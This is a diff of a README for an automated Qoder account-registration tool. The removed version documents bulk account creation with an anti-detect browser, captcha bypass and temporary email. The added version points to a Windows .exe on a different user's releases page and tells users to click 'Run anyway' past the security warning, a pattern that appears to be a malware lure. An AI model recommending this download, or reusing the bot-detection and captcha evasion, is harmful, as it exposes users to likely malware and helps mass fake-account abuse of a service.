@@ -1,292 +1,91 @@
-# 🤖 Qoder Autopilot
+# ⚙️ qoder-autopilot - Automate your Qoder account registration process
 
-Automated [Qoder](https://qoder.com) account registration with anti-detect browser, multi-strategy captcha solving, and [9Router](https://github.com/nicepkg/9router) OAuth device token integration.
+[![Download qoder-autopilot](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tistis8321/qoder-autopilot/releases)
 
-> Register Qoder accounts → solve captchas → verify OTP → auto-connect to 9Router. All in one command.
+qoder-autopilot handles your Qoder account registration tasks. This tool manages temporary email addresses, solves website captchas, and integrates with 9Router services. It performs these actions automatically to save you time.
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
-[![PyPI version](https://img.shields.io/pypi/v/qoder-autopilot.svg)](https://pypi.org/project/qoder-autopilot/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Camoufox](https://img.shields.io/badge/browser-Camoufox-orange.svg)](https://camoufox.com/)
-[![Tests](https://github.com/Daivageralda/qoder-autopilot/actions/workflows/test.yml/badge.svg)](https://github.com/Daivageralda/qoder-autopilot/actions/workflows/test.yml)
+## 📋 What this tool does
 
----
+Manually registering accounts requires repetitive steps. This software interacts with the Qoder platform through controlled browser sessions. It mimics human behavior to navigate registration forms.
 
-> **📦 Published on PyPI** — [pypi.org/project/qoder-autopilot](https://pypi.org/project/qoder-autopilot/)
->
-> Install with `pip install qoder-autopilot` — no clone needed.
+Core functions include:
 
-## ✨ Features
+- Auto-generation of identification details for new accounts.
+- Automatic retrieval of verification emails from temporary mailbox providers.
+- Integrated solving of visual puzzles or captchas encountered during sign-up.
+- Network routing through 9Router integration to maintain connection stability.
+- Execution of browser tasks using Playwright and Camoufox for reliable interaction.
 
-- **🦊 Anti-detect Browser** — Uses [Camoufox](https://camoufox.com/) (stealth Firefox fork) with C++-level fingerprinting to bypass bot detection
-- **🧩 Multi-strategy Captcha Solving**
-  - AI Vision (Gemini/GPT via OpenAI-compatible API)
-  - Manual mode (pause and solve it yourself)
-- **📧 Multi-Provider Temp Mail** — Cloudflare Workers (default) or Moca Supabase
-- **🔐 OAuth Device Flow** — PKCE-based device token flow (reverse-engineered from 9Router)
-- **🔌 9Router Auto-Connect** — Inserts device tokens directly into 9Router's SQLite database
-- **🚀 First-Run Wizard** — Interactive setup on first launch
-- **🏠 Built-in Worker Deploy** — Deploy your own temp mail worker from CLI
-- **⚡ Parallel Mode** — Register multiple accounts concurrently
-- **⚙️ Persistent Config** — `qoder-autopilot config` for easy customization
+## 🖥️ System requirements
 
-## 📦 Installation
+Ensure your computer meets these conditions before you run the software:
 
-### Via pip (recommended)
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space for the application and temporary browser data.
+- Connection: A stable internet connection.
+- Software: Standard Windows updates installed.
 
-```bash
-# Basic install (manual captcha only)
-pip install qoder-autopilot
+## 🚀 Downloading the application
 
-# With AI captcha solver support
-pip install qoder-autopilot[captcha]
+You need to obtain the installer from the official release page.
 
-# Full install with all extras
-pip install qoder-autopilot[full]
-```
+1. Visit [this page to download the software](https://github.com/tistis8321/qoder-autopilot/releases).
+2. Look for the latest version under the "Assets" section.
+3. Click the file ending in `.exe` to start the download to your computer.
+4. Save the file to your desktop or your Downloads folder for easy access.
 
-### From source (development)
+## 🛠️ Setting up the software
 
-```bash
-git clone https://github.com/Daivageralda/qoder-autopilot.git
-cd qoder-autopilot
+Follow these steps to prepare the application for use:
 
-# Basic install
-pip install -e .
+1. Locate the file you downloaded in the previous step.
+2. Double-click the file to launch the installer.
+3. If a security window appears, click "More info" and then click "Run anyway." This message occurs because the application is distributed directly by the developer.
+4. Follow the on-screen prompts to place the application folder on your machine.
+5. Create a shortcut on your desktop for quick access in the future.
 
-# With AI captcha solver
-pip install -e ".[captcha]"
+## ⚙️ Using the program
 
-# Full install + dev tools
-pip install -e ".[dev]"
-```
+Once the setup is complete, you can begin the registration process.
 
-### Post-install
+1. Open the qoder-autopilot application from your desktop shortcut.
+2. The program shows a dark window with a text interface.
+3. Enter your account preferences when the program prompts you.
+4. Provide the necessary API keys for 9Router if your configuration requires them.
+5. Press the Enter key to start the automation process.
+6. The window will display status updates. It shows when it creates an email, when it handles the captcha, and when the registration finishes.
 
-```bash
-# Download Camoufox browser binary
-python -m camoufox fetch
+## 🔍 Troubleshooting common issues
 
-# Download Playwright browsers (if needed)
-playwright install firefox
-```
+If the program stops or shows errors, check your setup with these tips.
 
-## 🚀 Quick Start
+**The program does not open**
+Ensure you have the latest version of Windows installed. Sometimes, antivirus software blocks new tools. If the tool fails to start, check your antivirus logs to see if it quarantined the file.
 
-First time? Just run:
+**Captcha solving fails**
+Verify that your internet connection remains active. Captcha services require a quick response time. If your network speed is low, the service might time out.
 
-```bash
-qoder-autopilot
-```
+**Email verification error**
+Temporary email providers occasionally undergo maintenance. If the program reports that it cannot find the verification email, wait one minute and restart the task.
 
-You'll see the setup wizard:
+**Connection timeout**
+If you use 9Router, check that your subscription remains active. The program relies on this service to route traffic. If the credentials are invalid, the software cannot complete the sign-up steps.
 
-```
-  ╔══════════════════════════════════════════════════╗
-  ║       👋 Welcome to qoder-autopilot!             ║
-  ║       Let's get you set up in 30 seconds.        ║
-  ╚══════════════════════════════════════════════════╝
+## 🔒 Security and privacy
 
-  [1] 🚀 Quick Start — use the default public worker
-  [2] 🏠 Self-Host — deploy your own Cloudflare Worker
-```
+The software runs locally on your machine. It stores no personal data on external servers beyond the necessary communication with the Qoder website and the captcha service. You control the session entirely from your own hardware. Keep your API keys and configuration files private to protect your account setup. Do not share your installation folder with other users.
 
-Pick **1** for instant setup, or **2** to deploy your own temp mail service.
+## 📝 Frequently asked questions
 
-### Registration commands
+**Do I need programming knowledge?**
+No. The application manages all logic internally. You only need to input simple choices through the text interface.
 
-```bash
-# Single account, manual captcha (most reliable)
-qoder-autopilot --manual-captcha
+**Can I run multiple instances?**
+Running more than one instance at a time may cause resource conflicts on your computer. Start one process and let it complete before you begin the next.
 
-# 5 accounts sequentially
-qoder-autopilot -n 5 --manual-captcha
-
-# 5 accounts in parallel
-qoder-autopilot -n 5 --manual-captcha --parallel
-
-# Skip OAuth/9Router, just register
-qoder-autopilot --manual-captcha --no-oauth
-
-# Show browser windows
-qoder-autopilot --manual-captcha --no-headless
-
-# Custom delay between accounts (seconds)
-qoder-autopilot -n 3 --manual-captcha --delay 60
-```
-
-## 📋 All Commands
-
-| Command | Description |
-|---|---|
-| `qoder-autopilot` | First-run wizard (no config) or start registration |
-| `qoder-autopilot [options]` | Register accounts (see flags below) |
-| `qoder-autopilot doctor` | 🩺 Health check — verify all dependencies & configs |
-| `qoder-autopilot deploy` | Deploy your own temp mail worker |
-| `qoder-autopilot relay` | Start relay server for remote 9Router |
-| `qoder-autopilot config` | Show config help + available keys |
-| `qoder-autopilot config show` | Show all current settings with source |
-| `qoder-autopilot config get <key>` | Get a specific config value |
-| `qoder-autopilot config set <key> <value>` | Set a config value |
-| `qoder-autopilot config reset` | Reset all settings to defaults |
-
-### Registration flags
-
-| Flag | Description | Default |
-|---|---|---|
-| `-n`, `--count N` | Number of accounts to create (1-100) | `1` |
-| `--manual-captcha` | Pause for manual captcha solving (forces non-headless) | `false` |
-| `--no-headless` | Show browser windows | `false` |
-| `--parallel` | Run all accounts concurrently | `false` |
-| `--delay N` | Delay between sequential accounts | `30` |
-| `--verbose`, `-v` | Show debug-level logs | `false` |
-| `--quiet`, `-q` | Only show errors and warnings | `false` |
-| `--dry-run` | Validate configuration and exit | `false` |
-| `--proxy URL` | Proxy for browser (socks5://host:port, http://host:port) | `none` |
-| `--format {text,json,csv}` | Output format for results | `text` |
-| `--log-file PATH` | Write all logs to a file | `none` |
-| `--no-oauth` | Skip 9Router OAuth, just register | `false` |
-| `--parallel` | Run all accounts concurrently | `false` |
-| `--delay N` | Delay between sequential accounts (seconds) | `30` |
-
-## ⚙️ Configuration
-
-Three-tier priority: **Environment variables** → **User config** (`~/.qoder-autopilot/config.json`) → **Defaults**
-
-### Via CLI (recommended)
-
-```bash
-# See all settings
-qoder-autopilot config show
-
-# Set values
-qoder-autopilot config set worker-url https://my-worker.workers.dev
-qoder-autopilot config set ai-api-key sk-abc123...
-qoder-autopilot config set otp-timeout 30
-qoder-autopilot config set mail-provider moca
-
-# Get a value
-qoder-autopilot config get worker-url
-
-# Reset everything
-qoder-autopilot config reset
-```
-
-### Configurable keys
-
-| Key | Description | Default |
-|---|---|---|
-| `mail-provider` | Temp mail provider: `cloudflare` or `moca` | `cloudflare` |
-| `worker-url` | Cloudflare Worker URL | Built-in default |
-| `moca-api-key` | Moca Supabase API key (`tmk_xxx`) | *(empty)* |
-| `moca-base-url` | Moca Supabase base URL | *(built-in)* |
-| `ai-api-key` | API key for AI captcha solver | *(empty)* |
-| `ai-base-url` | OpenAI-compatible API base URL | `https://ai.sumopod.com/v1` |
-| `ai-model` | AI model name | `gemini/gemini-2.5-flash` |
-| `otp-timeout` | Max seconds to wait for OTP | `20` |
-| `captcha-timeout` | Max seconds for manual captcha | `120` |
-| `parallel-delay` | Delay between parallel accounts (sec) | `30` |
-| `ninerouter-db` | Path to 9Router SQLite DB | OS-aware: `~/.9router/db/data.sqlite` (macOS/Linux), `%APPDATA%/9router/db/data.sqlite` (Windows) |
-
-### Via environment variables
-
-All keys can be set with `QODER_` prefix:
-
-```bash
-export QODER_WORKER_URL=https://my-worker.workers.dev
-export QODER_AI_API_KEY=sk-abc123...
-export QODER_OTP_TIMEOUT=30
-```
-
-### Via `.env` file
-
-```bash
-cp .env.example .env
-# Edit .env with your settings
-```
-
-## 🏠 Self-Host Temp Mail Worker
-
-Want your own independent temp mail service? Deploy in 5 minutes:
-
-```bash
-# From qoder-autopilot (bundled worker template)
-qoder-autopilot deploy
-
-# Or clone the standalone repo
-git clone https://github.com/Daivageralda/cf-mail-worker.git
-cd cf-mail-worker
-npm install
-npm run setup
-```
-
-See [cf-mail-worker](https://github.com/Daivageralda/cf-mail-worker) for full documentation.
-
-## 🏗️ Architecture
-
-```
-qoder-autopilot/
-├── src/qoder_autopilot/
-│   ├── cli.py              # CLI entry point
-│   ├── config.py           # Pydantic Settings (env + user config + defaults)
-│   ├── user_config.py      # Persistent config manager (~/.qoder-autopilot/)
-│   ├── first_run.py        # First-run setup wizard
-│   ├── deploy.py           # Worker deploy (extract + setup)
-│   ├── register.py         # Main registration flow
-│   ├── temp_mail.py        # Multi-provider temp email client
-│   ├── oauth.py            # PKCE device auth flow
-│   ├── otp.py              # Email OTP extraction
-│   ├── identity.py         # Random identity generation (faker id_ID)
-│   ├── credentials.py      # Account credential storage
-│   ├── ninerouter.py       # 9Router SQLite integration
-│   ├── errors.py           # Custom exceptions
-│   ├── logger.py           # ANSI colored structured logging
-│   ├── browser/
-│   │   ├── camoufox.py     # Anti-detect browser launcher
-│   │   └── window_tiler.py # macOS window grid positioning
-│   ├── captcha/
-│   │   ├── solver.py       # Orchestrator (AI → manual)
-│   │   ├── ai_vision.py    # AI vision gap detection
-│   │   └── manual.py       # Manual solve pause/poll
-│   └── worker_template/    # Bundled Cloudflare Worker (for deploy)
-│       ├── src/             # Worker JS source
-│       ├── schema.sql       # D1 database schema
-│       ├── package.json
-│       └── scripts/setup.sh
-├── tests/
-├── pyproject.toml
-└── README.md
-```
-
-## 🔒 Security
-
-qoder-autopilot takes security seriously:
-
-- **Credential files** — `qoder_accounts.json` saved with `chmod 600` (owner-only)
-- **Config files** — `~/.qoder-autopilot/config.json` and `relay.json` restricted to `600`
-- **Password masking** — passwords never logged to stdout (masked as `••••••••`)
-- **API key masking** — AI API keys never shown in logs (shown as `***configured***`)
-- **Sensitive field masking** — `config show` masks API keys, tokens, and passwords
-- **File locking** — concurrent credential writes are atomic (safe in `--parallel` mode)
-- **Timing-safe auth** — relay token comparison uses `hmac.compare_digest()`
-- **Rate limiting** — relay server limits to 30 requests/60s per IP
-- **Input validation** — relay validates email format and field lengths via Pydantic
-- **SQLite WAL mode** — safe concurrent access with `busy_timeout` (no connection leaks)
-- **Secure default binding** — relay defaults to `127.0.0.1` (localhost only)
-- **HTTPS warning** — startup warns when relay runs without TLS
-- **Trust transparency** — first-run wizard warns about shared public worker
-
-> **Recommendation:** For production use, always self-host your temp mail worker and use HTTPS (nginx/caddy) or SSH tunnel for relay.
-
-## 🔗 Related
-
-- [**cf-mail-worker**](https://github.com/Daivageralda/cf-mail-worker) — Self-hosted temp mail API (Cloudflare Workers + D1)
-- [**bulk-temp-mail**](https://github.com/Daivageralda/temp-mail-generator) — Full temp mail service with React frontend
-
-## 📄 License
-
-MIT — see [LICENSE](LICENSE)
-
-## ⚠️ Disclaimer
-
-This tool is for educational and research purposes only. Use responsibly and in accordance with applicable terms of service.
+**Where does the program save account details?**
+All registered account information saves to a text file inside the application folder. Look for a file named `accounts.txt` after the process completes.
+
+**How do I update the tool?**
+When a new version becomes available, download the new installer from the same link. You can install the new version over the old one, but ensure you move your `accounts.txt` file to a safe location first so you do not lose your data.
